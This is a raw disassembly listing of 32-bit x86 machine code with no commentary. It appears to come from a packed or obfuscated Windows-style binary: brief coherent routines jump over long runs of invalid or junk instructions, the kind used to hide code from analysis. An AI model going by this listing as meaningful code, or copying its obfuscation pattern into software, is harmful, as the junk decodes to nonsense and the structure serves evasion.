  40a823:	xchg   edx,eax
  40a824:	mov    ch,0xae
  40a826:	xor    ah,dl
  40a828:	lods   eax,DWORD PTR ds:[esi]
  40a829:	lock and al,0xf3
  40a82c:	lea    ebx,ds:0xcc78f34f
  40a832:	mov    ?,WORD PTR [ecx+eiz*1+0x28]
  40a836:	mov    bl,0x19
  40a838:	pop    ebp
  40a839:	xchg   ebp,eax
  40a83a:	dec    eax
  40a83b:	push   0x60
  40a83d:	dec    ebp
  40a83e:	cmp    DWORD PTR [ebx+eax*1+0xc],0x18
  40a843:	stc    
  40a844:	(bad)  
  40a847:	lods   eax,DWORD PTR ds:[esi]
  40a848:	mov    cl,0x50
  40a84a:	cli    
  40a84b:	in     al,0xf3
  40a84d:	jns    0x40a8bb
  40a84f:	mov    al,ds:0x3cb30f4e
  40a854:	rol    BYTE PTR [ebx],cl
  40a856:	shr    DWORD PTR [ecx],cl
  40a858:	mov    eax,0x637d4443
  40a85d:	clc    
  40a85e:	inc    edx
  40a85f:	jne    0x40a8a0
  40a861:	dec    esi
  40a862:	adc    al,BYTE PTR [esi-0x60529687]
  40a868:	pop    ebx
  40a869:	inc    ebp
  40a86a:	imul   ebp,DWORD PTR [ebp-0x9],0xcd9d06d2
  40a871:	inc    BYTE PTR [ecx+0x2]
  40a874:	scas   eax,DWORD PTR es:[edi]
  40a875:	and    edx,0x4147e293
  40a87b:	imul   DWORD PTR [ebx+0x6d]
  40a87e:	sub    esi,esp
  40a880:	scas   al,BYTE PTR es:[edi]
  40a881:	xor    BYTE PTR [edx-0x73],dl
  40a884:	mov    ds:0x5426d214,eax
  40a889:	mov    dh,0xd6
  40a88b:	cmp    eax,0x42f2f143
  40a890:	xchg   edx,eax
  40a891:	bound  ebp,QWORD PTR [edx+0x3e9f9000]
  40a897:	adc    edx,edi
  40a899:	pop    esi
  40a89a:	repz popf 
  40a89c:	push   cs
  40a89d:	fstp   DWORD PTR [edi-0x47]
  40a8a0:	mov    DWORD PTR ds:0xcb5cf9ae,esi
  40a8a6:	xlat   BYTE PTR ds:[ebx]
  40a8a7:	push   esi
  40a8a8:	xchg   esp,eax
  40a8a9:	mov    bl,0x9d
  40a8ab:	in     al,dx
  40a8ac:	je     0x40a872
  40a8ae:	mov    dl,0xac
  40a8b0:	dec    edi
  40a8b1:	cmp    ecx,edi
  40a8b3:	adc    bh,al
  40a8b5:	push   0x72
  40a8b7:	(bad)  
  40a8b8:	ins    BYTE PTR es:[edi],dx
  40a8b9:	test   eax,0x7d9bb4eb
  40a8be:	jecxz  0x40a89a
  40a8c0:	int    0xea
  40a8c2:	push   ss
  40a8c3:	popa   
  40a8c4:	dec    ecx
  40a8c5:	cmp    DWORD PTR [ebx],0xffffffe8
  40a8c8:	fdivr  st(5),st
  40a8ca:	fadd   QWORD PTR [ecx+eax*8+0x33]
  40a8ce:	mov    esi,0xc7c9a392
  40a8d3:	enter  0x46cf,0x0
  40a8d7:	out    0x8e,al
  40a8d9:	fst    QWORD PTR ds:0xf9fe921f
  40a8df:	mov    DWORD PTR [edi+0x4af6f17a],eax
  40a8e5:	mov    al,0x95
  40a8e7:	push   cs
  40a8e8:	imul   ebp,DWORD PTR [ebx+0xd],0xac8ca75c
  40a8ef:	loop   0x40a8c0
  40a8f1:	(bad)  
  40a8f2:	icebp  
  40a8f3:	push   ecx
  40a8f4:	(bad)  
  40a8f5:	out    dx,eax
  40a8f6:	enter  0x2249,0x32
  40a8fa:	clc    
  40a8fb:	shl    BYTE PTR [ecx],cl
  40a8fd:	les    eax,FWORD PTR [eax+0x6da6e056]
  40a903:	and    BYTE PTR [ecx+ecx*1+0x4a64b511],0x68
  40a90b:	adc    edi,0xffffff83
  40a90e:	mov    edi,0xafdb47b5
  40a913:	sti    
  40a914:	add    DWORD PTR ds:0x31b7b1ad,esi
  40a91a:	adc    eax,0x56fc458b
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	shl    DWORD PTR [esp+ecx*4-0x26],0xe0
  40a9ab:	cmp    bh,BYTE PTR [esi+0x7e]
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a9d4
  40a9b3:	sbb    eax,0xd5874e5a
  40a9b8:	daa    
  40a9b9:	fldenv [esi-0x4b8fe79c]
  40a9bf:	jnp    0x40a9e6
  40a9c1:	jae    0x40a991
  40a9c3:	lds    edx,FWORD PTR [edx-0x19]
  40a9c6:	xor    DWORD PTR [edi],ebx
  40a9c8:	pop    ds
  40a9c9:	jg     0x40a9ee
  40a9cb:	(bad)  
  40a9cc:	leave  
  40a9cd:	or     BYTE PTR [ecx+0x17e2d2ad],ah
  40a9d3:	lods   eax,DWORD PTR ds:[esi]
  40a9d4:	jmp    0x40a97f
  40a9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9d7:	(bad)
  40a9db:	fucomi st,st(4)
  40a9dd:	xor    esi,DWORD PTR [eax]
  40a9df:	or     BYTE PTR [ebp+0x29561a18],dl
  40a9e5:	mov    dh,BYTE PTR [edx+0x1b]
  40a9e8:	lock dec ebp
  40a9ea:	push   eax
  40a9eb:	jns    0x40a9af
  40a9ed:	sub    ebp,DWORD PTR [ecx]
  40a9ef:	push   ecx
  40a9f0:	and    BYTE PTR ds:0xfbcdbe34,0x21
  40a9f7:	pop    DWORD PTR [ecx]
  40a9f9:	dec    edi
  40a9fa:	cld    
  40a9fb:	xor    BYTE PTR ds:0x47ffc3f1,bh
  40aa01:	jae    0x40a9d3
  40aa03:	jl     0x40a9a9
  40aa05:	ins    DWORD PTR es:[edi],dx
  40aa06:	sbb    edi,DWORD PTR [ecx+0x4a916a8d]
  40aa0c:	mov    al,bh
  40aa0e:	fldenv [edi+0x74490904]
  40aa14:	push   ebp
  40aa15:	in     al,dx
  40aa16:	into   
  40aa17:	or     esp,ebp
  40aa19:	out    0x4c,al
  40aa1b:	push   eax
  40aa1c:	mov    BYTE PTR [ebx+0x36dc0c09],ch
  40aa22:	sti    
  40aa23:	ins    BYTE PTR es:[edi],dx
  40aa24:	ss nop
  40aa26:	fidiv  WORD PTR [ecx+0x7746bc55]
  40aa2c:	retf   
  40aa2d:	or     al,0x23
  40aa2f:	not    BYTE PTR ds:0x1f2007fc
  40aa35:	add    edx,eax
  40aa37:	gs test al,0x4e
  40aa3a:	adc    eax,0x65674365
  40aa3f:	push   edx
  40aa40:	test   al,0x8
  40aa42:	cmp    edi,DWORD PTR [esp+ecx*8]
  40aa45:	sub    eax,0xe883aa54
  40aa4a:	jne    0x40a9d3
  40aa4c:	push   ss
  40aa4d:	daa    
  40aa4e:	xchg   ecx,eax
  40aa4f:	aad    0x8a
  40aa51:	jle    0x40aad1
  40aa53:	add    DWORD PTR [edx+0x69ff1deb],ebp
  40aa59:	and    bl,BYTE PTR [ebx]
  40aa5b:	adc    BYTE PTR [ebp-0x3b2615d0],ch
  40aa61:	popa   
  40aa62:	sub    eax,0xb830e04b
  40aa67:	bnd jae 0x40aa36
  40aa6a:	ss dec edi
  40aa6c:	add    DWORD PTR [ecx],edx
  40aa6e:	in     al,dx
  40aa6f:	sbb    DWORD PTR [ebx],ecx
  40aa71:	push   edx
  40aa72:	aas    
  40aa73:	imul   ecx,DWORD PTR [edi+0xbfa03b4],0x5f
  40aa7a:	inc    ebp
  40aa7b:	repnz mov al,ds:0x9760c8bd
  40aa81:	or     BYTE PTR [eax-0x7a49a57],0x25
  40aa88:	mov    esi,0x4aa41b1c
  40aa8d:	les    edi,FWORD PTR [esi]
  40aa8f:	mov    eax,DWORD PTR [ebp-0x4]
  40aa92:	inc    esp
  40aa93:	bound  ecx,QWORD PTR [ebx-0x59]
  40aa96:	mov    bl,0x3d
  40aa98:	and    eax,0x55b01c98
  40aa9d:	shl    DWORD PTR [ebx+0x268acdce],1
  40aaa3:	adc    ebx,DWORD PTR [edi-0x21585a79]
  40aaa9:	or     BYTE PTR [edx-0x55],ch
  40aaac:	pop    ebx
  40aaad:	pop    eax
  40aaae:	add    al,0x19
  40aab0:	popf   
  40aab1:	jbe    0x40aa7f
  40aab3:	xchg   ebx,eax
  40aab4:	retf   
  40aab5:	mov    esi,0x3726ff09
  40aaba:	lds    edx,FWORD PTR [esi]
  40aabc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabd:	clc    
  40aabe:	pop    ds
  40aabf:	add    DWORD PTR [ecx],eax
  40aac1:	fsubr  st,st(5)
  40aac3:	mov    dl,BYTE PTR ds:0x808182b3
  40aac9:	sbb    ebp,esi
  40aacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aacc:	pusha  
  40aacd:	test   eax,0x98fc5198
  40aad2:	mov    ebx,0x60c0fbfd
  40aad7:	repz add DWORD PTR [edi-0x74],ebx
  40aadb:	mov    eax,0xd3b0e3bb
  40aae0:	push   edx
  40aae1:	les    edi,FWORD PTR [ebx-0x41]
  40aae4:	iret   
  40aae5:	popa   
  40aae6:	aas    
  40aae7:	push   esi
  40aae8:	cld    
  40aae9:	sub    BYTE PTR [edi-0x521bc146],0xa0
  40aaf0:	and    al,0xc2
  40aaf2:	and    eax,0x459c1eac
  40aaf7:	and    eax,0xa3dc2435
  40aafc:	js     0x40ab15
  40aafe:	in     al,0x12
  40ab00:	popa   
  40ab01:	mov    dh,0xf6
  40ab03:	lods   eax,DWORD PTR ds:[esi]
  40ab04:	mov    ecx,DWORD PTR [ebp-0x2a64206d]
  40ab0a:	pop    ebp
  40ab0b:	mov    eax,0x33c233e1
  40ab10:	repnz add eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x9fbbac8b
  40ab26:	scas   al,BYTE PTR es:[edi]
  40ab27:	ret    0x3b4f
  40ab2a:	jle    0x40abaa
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40ab57
  40ab31:	fistp  DWORD PTR [edx-0x6f]
  40ab34:	and    BYTE PTR [edx+0x384d478b],ah
  40ab3a:	fdiv   st(4),st
  40ab3c:	jmp    0x2435:0xe42123e2
  40ab43:	stos   DWORD PTR es:[edi],eax
  40ab44:	out    0xbb,al
  40ab46:	inc    edx
  40ab47:	add    al,BYTE PTR [ebp+ebp*8-0x57]
  40ab4b:	addr16 call 0xe9d4:0xc18e225a
  40ab53:	out    dx,al
  40ab54:	jmp    0x40aba7
  40ab56:	cmp    eax,0x2efbcb15
  40ab5b:	cld    
  40ab5c:	or     al,0x4b
  40ab5e:	ror    BYTE PTR ds:0x7bb25b9b,1
  40ab64:	xchg   esi,eax
  40ab65:	adc    DWORD PTR [ebx],ecx
  40ab67:	pop    edx
  40ab68:	lods   eax,DWORD PTR ds:[esi]
  40ab69:	scas   eax,DWORD PTR es:[edi]
  40ab6a:	mov    ch,0xdc
  40ab6c:	fsub   QWORD PTR [ebx-0x38]
  40ab6f:	xchg   ebx,eax
  40ab70:	je     0x40abc8
  40ab72:	repz mov eax,0xbb5c59b9
  40ab78:	fmul   DWORD PTR [ebx+eiz*2]
  40ab7b:	sbb    eax,0xe42af2e3
  40ab80:	push   ecx
  40ab81:	sbb    al,0x29
  40ab83:	nop
  40ab84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab85:	lock or ecx,ecx
  40ab88:	sbb    BYTE PTR [eax],dl
  40ab8a:	fdivr  st,st(2)
  40ab8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab8e:	hlt    
  40ab8f:	ja     0x40abb0
  40ab91:	sti    
  40ab92:	push   0xe900a896
  40ab97:	cmp    BYTE PTR [edx-0x1eefaa82],al
  40ab9d:	loope  0x40ab24
  40ab9f:	jmp    0x6273e05e
  40aba4:	and    DWORD PTR [edi],ecx
  40aba6:	mov    edi,0xcecdff9a
  40abab:	mov    BYTE PTR [ecx+edx*2-0x31af0fb1],0x25
  40abb3:	(bad)  
  40abb4:	jg     0x40ab7f
  40abb6:	dec    esp
  40abb7:	pop    edi
  40abb8:	into   
  40abb9:	jle    0x40ab8b
  40abbb:	sbb    BYTE PTR [edx+0x4c],bl
  40abbe:	outs   dx,BYTE PTR ds:[esi]
  40abbf:	jb     0x40aba4
  40abc1:	fcomp  QWORD PTR [ebp+0x6afd01ef]
  40abc7:	sahf   
  40abc8:	in     eax,0xd2
  40abca:	xchg   ecx,eax
  40abcb:	inc    ecx
  40abcc:	int    0x1
  40abce:	or     eax,0x2b75f0c2
  40abd3:	retf   0xd2bf
  40abd6:	(bad)  
  40abd7:	jmp    0x40ac05
  40abd9:	xor    eax,0x792c7389
  40abde:	xchg   BYTE PTR [edi+edi*2-0x59],bl
  40abe2:	inc    eax
  40abe3:	pop    es
  40abe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abe5:	int3   
  40abe6:	mov    bh,0xd
  40abe8:	xchg   esi,edx
  40abea:	pop    ds
  40abeb:	mov    eax,DWORD PTR [edx+0x5cbb47c5]
  40abf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abf2:	shl    BYTE PTR [ebp-0x5147329],1
  40abf8:	mov    dl,0x20
  40abfa:	sar    BYTE PTR [esi-0x3a],0xa7
  40abfe:	xor    BYTE PTR [esi+0x1],0x8f
  40ac02:	sti    
  40ac03:	and    eax,0xe9e33336
  40ac08:	lds    edx,FWORD PTR [ebx-0x64]
  40ac0b:	call   0xee8b98d2
  40ac10:	push   ecx
  40ac11:	aad    0x8e
  40ac13:	in     eax,dx
  40ac14:	cs lock jno 0x40ac0c
  40ac18:	and    esi,esp
  40ac1a:	loope  0x40ac6c
  40ac1c:	fisttp QWORD PTR [eax-0x17]
  40ac1f:	jg     0x40ac0c
  40ac21:	cmp    BYTE PTR [ebx],ah
  40ac23:	test   al,0xa6
  40ac25:	mov    bh,0x96
  40ac27:	add    al,0x36
  40ac29:	sar    BYTE PTR [ebx-0x1d],1
  40ac2c:	jo     0x40abb2
  40ac2e:	cmp    eax,0x29ad75cc
  40ac33:	push   0x144c68b0
  40ac38:	stos   BYTE PTR es:[edi],al
  40ac39:	loope  0x40ac08
  40ac3b:	add    al,0x69
  40ac3d:	xchg   ebx,eax
  40ac3e:	test   al,0x9e
  40ac40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac41:	mov    ah,0x6d
  40ac43:	xchg   edi,eax
  40ac44:	lods   al,BYTE PTR ds:[esi]
  40ac45:	mov    dl,0x15
  40ac47:	jns    0x40abce
  40ac49:	cmp    DWORD PTR [esi],edi
  40ac4b:	loop   0x40acc9
  40ac4d:	mov    al,BYTE PTR [edx]
  40ac4f:	or     eax,0xd62954a
  40ac54:	loope  0x40ac37
  40ac56:	pop    eax
  40ac57:	pushf  
  40ac58:	std    
  40ac59:	inc    esi
  40ac5a:	jp     0x40ac6a
  40ac5c:	sub    dh,BYTE PTR [edi+0x560e0eb7]
  40ac62:	push   ebx
  40ac63:	ds mov ebx,0xdeb012e
  40ac69:	sti    
  40ac6a:	stc    
  40ac6b:	add    al,0x93
  40ac6d:	xor    al,0x3b
  40ac6f:	pop    ebp
  40ac70:	inc    ebx
  40ac71:	mov    ah,0x7a
  40ac73:	cmp    BYTE PTR [eax+0x50],ah
  40ac76:	xchg   BYTE PTR [edx-0x10a70b6b],al
  40ac7c:	(bad)  
  40ac7d:	jmp    FWORD PTR [ecx-0x2bfd2f14]
  40ac83:	sti    
  40ac84:	mov    edi,0xc933c346
  40ac89:	push   ss
  40ac8a:	aaa    
  40ac8b:	add    esi,ecx
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    eax,edi
  40acbc:	xchg   esp,eax
  40acbd:	dec    ebx
  40acbe:	push   0x2a
  40acc0:	cmp    DWORD PTR [esi+0x7e],edi
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ad39
  40acc8:	sbb    ebp,0x17
  40accb:	jbe    0x40ac95
  40accd:	nop    esi
  40acd0:	cmp    DWORD PTR [ebp+0x3e],edx
  40acd3:	dec    eax
  40acd4:	sbb    ebp,0x96924cb2
  40acda:	xchg   esi,eax
  40acdb:	mov    ch,0x49
  40acdd:	retf   0x1080
  40ace0:	sub    esp,edi
  40ace2:	jle    0x40acbf
  40ace4:	push   ebx
  40ace5:	add    ah,BYTE PTR [esi]
  40ace7:	and    eax,0xfe46c68a
  40acec:	ficom  DWORD PTR [ecx+0x57a86451]
  40acf2:	retf   0x6ba1
  40acf5:	jnp    0x40ac8b
  40acf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf8:	or     BYTE PTR [eax-0x163f2dab],bh
  40acfe:	arpl   WORD PTR [edi],ax
  40ad00:	dec    edi
  40ad01:	sub    BYTE PTR [ebp-0x29976ae6],0xdf
  40ad08:	inc    ecx
  40ad09:	dec    di
  40ad0b:	fwait
  40ad0c:	add    al,0x20
  40ad0e:	pop    eax
  40ad0f:	jmp    0xa355:0x7c85dd9c
  40ad16:	inc    ebx
  40ad17:	arpl   bp,sp
  40ad19:	dec    edx
  40ad1a:	push   eax
  40ad1b:	repnz pushf 
  40ad1d:	xor    edi,ebx
  40ad1f:	mov    edi,0xa2d76512
  40ad24:	cmc    
  40ad25:	jle    0x40ad8e
  40ad27:	mov    ch,BYTE PTR [edi-0x51b046dd]
  40ad2d:	imul   eax,DWORD PTR [esi+eiz*4],0xbd356739
  40ad34:	loopne 0x40acdf
  40ad36:	aam    0xff
  40ad38:	std    
  40ad39:	sti    
  40ad3a:	mov    ch,0xe8
  40ad3c:	lock mov ch,0x9b
  40ad3f:	and    al,0xc6
  40ad41:	ins    BYTE PTR es:[edi],dx
  40ad42:	push   ebx
  40ad43:	jle    0x40ad7d
  40ad45:	and    cl,BYTE PTR [eax-0x26b013db]
  40ad4b:	xor    DWORD PTR [ecx],esp
  40ad4d:	xchg   ecx,eax
  40ad4e:	in     al,0x90
  40ad50:	push   ebx
  40ad51:	stos   BYTE PTR es:[edi],al
  40ad52:	jl     0x40ad3d
  40ad54:	mov    eax,0x85334127
  40ad59:	mov    ecx,0xa1a5c295
  40ad5e:	cmp    BYTE PTR [ebx],al
  40ad60:	fld    DWORD PTR [eax]
  40ad62:	inc    ebx
  40ad63:	xchg   ecx,eax
  40ad64:	(bad)  
  40ad65:	out    0x58,eax
  40ad67:	adc    ah,BYTE PTR [ebp-0x21f40010]
  40ad6d:	xchg   ecx,eax
  40ad6e:	and    BYTE PTR [ecx-0x4],cl
  40ad71:	add    DWORD PTR [esi-0x755d32ca],0xffb65a6f
  40ad7b:	scas   eax,DWORD PTR es:[edi]
  40ad7c:	in     al,0x56
  40ad7e:	clc    
  40ad7f:	add    DWORD PTR [ebx-0x23f386e5],edx
  40ad85:	jo     0x40ad3f
  40ad87:	or     edi,DWORD PTR [edx-0x3707075f]
  40ad8d:	xor    bh,BYTE PTR [edi-0x1340b672]
  40ad93:	repz mov ax,0x9c91
  40ad98:	pop    ecx
  40ad99:	(bad)  
  40ad9a:	out    dx,al
  40ad9b:	and    BYTE PTR [esi+edx*8+0x751cde2f],0xdc
  40ada3:	(bad)  
  40ada4:	mov    ebp,0x24f0e439
  40ada9:	mov    esp,0x9bd2fbb6
  40adae:	jl     0x40ae06
  40adb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adb1:	jg     0x40ad91
  40adb3:	(bad)  
  40adb4:	mov    BYTE PTR [ebp+0x642f6a2a],bl
  40adba:	push   ss
  40adbb:	xlat   BYTE PTR ds:[ebx]
  40adbc:	sub    eax,0x256474f1
  40adc1:	sbb    bh,bh
  40adc3:	(bad)
  40adc6:	lahf   
  40adc7:	inc    edi
  40adc8:	inc    edi
  40adc9:	mov    ebx,0xdc17ef9a
  40adce:	retf   
  40adcf:	pusha  
  40add0:	cmp    al,0x56
  40add2:	xchg   DWORD PTR [ebp+0x69],ebx
  40add5:	jge    0x40adcd
  40add7:	mov    eax,ds:0x17b16bb6
  40addc:	test   al,0x40
  40addf:	fisub  WORD PTR [eax+0x30]
  40ade2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade3:	jbe    0x40ade1
  40ade5:	add    ecx,0xffffffef
  40ade8:	xchg   bx,ax
  40adea:	movd   DWORD PTR [esi+0x13],mm5
  40adee:	mov    ecx,0x7823db5d
  40adf3:	cmp    al,0x8d
  40adf5:	mov    edi,0xd0c1433f
  40adfa:	hlt    
  40adfb:	pop    eax
  40adfc:	xchg   esp,eax
  40adfd:	in     eax,0x0
  40adff:	bound  ebx,QWORD PTR [edx]
  40ae01:	mov    cl,0x14
  40ae03:	push   esp
  40ae04:	hlt    
  40ae05:	sub    BYTE PTR [edi+0x195c6707],bl
  40ae0b:	retf   
  40ae0c:	ins    DWORD PTR es:[edi],dx
  40ae0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae0e:	push   esi
  40ae0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae10:	jecxz  0x40ad93
  40ae12:	xlat   BYTE PTR ds:[ebx]
  40ae13:	inc    edx
  40ae14:	sbb    al,ch
  40ae16:	push   esp
  40ae17:	mov    ch,0xc1
  40ae19:	loope  0x40adab
  40ae1b:	int3   
  40ae1c:	mov    ebx,0x9ecd21f9
  40ae21:	inc    edx
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x80268d5d
  40ae94:	jmp    0x3f320227
  40ae99:	jle    0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	cmp    bh,BYTE PTR [ecx-0x24]
  40aea2:	sub    esi,DWORD PTR [ebx-0x4ef08209]
  40aea8:	int    0xf1
  40aeaa:	out    dx,eax
  40aeab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeac:	cmc    
  40aead:	sub    BYTE PTR [esi],ah
  40aeaf:	lods   al,BYTE PTR ds:[esi]
  40aeb0:	jbe    0x40aeae
  40aeb2:	test   al,0x48
  40aeb4:	fnstsw WORD PTR ds:0x5f38c228
  40aeba:	shl    ebp,cl
  40aebc:	leave  
  40aebd:	shl    BYTE PTR [eax-0x7242b60d],0x3d
  40aec4:	ret    0x2cbf
  40aec7:	cmc    
  40aec8:	pusha  
  40aec9:	(bad)  
  40aeca:	pop    ebx
  40aecb:	aam    0xe2
  40aecd:	jmp    0x40ae77
  40aecf:	arpl   si,di
  40aed1:	sbb    al,0xf6
  40aed3:	pusha  
  40aed4:	or     al,0x92
  40aed6:	dec    ebp
  40aed7:	jno    0x40ae9a
  40aed9:	mov    bh,0xb6
  40aedb:	sub    DWORD PTR [edi+0xf],edx
  40aede:	xchg   ecx,eax
  40aedf:	inc    ecx
  40aee0:	fadd   st,st(4)
  40aee2:	jae    0x40ae71
  40aee4:	adc    BYTE PTR es:[ebp+esi*8-0x52],dl
  40aee9:	nop
  40aeea:	repnz mov ds:0x4c3e1435,al
  40aef0:	mov    esp,0xd492b620
  40aef5:	sub    DWORD PTR [eax],eax
  40aef7:	rol    DWORD PTR [eax],1
  40aef9:	sbb    al,0xc3
  40aefb:	jl     0x40aea0
  40aefd:	ja     0x40af56
  40aeff:	ror    BYTE PTR [edx],0xef
  40af02:	add    eax,0xf8124c6a
  40af07:	push   es
  40af08:	shr    DWORD PTR [esi-0x2b],0x96
  40af0c:	cmp    dh,BYTE PTR [esi]
  40af0e:	jp     0x40af29
  40af10:	mov    ebp,0x6d5cea4e
  40af15:	pop    es
  40af16:	ins    BYTE PTR es:[edi],dx
  40af17:	or     edi,DWORD PTR [edi+0x2f]
  40af1a:	cmp    eax,0xcd96bdc
  40af1f:	add    eax,0x41f3ea0d
  40af24:	lds    edx,FWORD PTR [eax-0x47cb62]
  40af2a:	or     BYTE PTR [ebp-0x6b5b3ff6],cl
  40af30:	out    dx,eax
  40af31:	and    eax,DWORD PTR [ebx+0x30]
  40af34:	dec    esi
  40af35:	retf   0x6d96
  40af38:	adc    ecx,esi
  40af3a:	jge    0x40aefb
  40af3c:	int    0x58
  40af3e:	dec    edi
  40af3f:	aad    0xcf
  40af41:	enter  0xc67c,0x3b
  40af45:	mov    al,0x36
  40af47:	push   ebp
  40af48:	jnp    0x40aed9
  40af4a:	pop    edx
  40af4b:	or     al,0x44
  40af4d:	add    eax,0xcf5f8369
  40af52:	and    al,0xa9
  40af54:	ins    DWORD PTR es:[edi],dx
  40af55:	dec    BYTE PTR [ebp-0x3b]
  40af58:	ins    BYTE PTR es:[edi],dx
  40af59:	mov    eax,0x1a788e15
  40af5e:	jo     0x40af81
  40af60:	cmp    DWORD PTR [ebp+0x2fe5671b],0x729fbb56
  40af6a:	xor    al,BYTE PTR [eax]
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
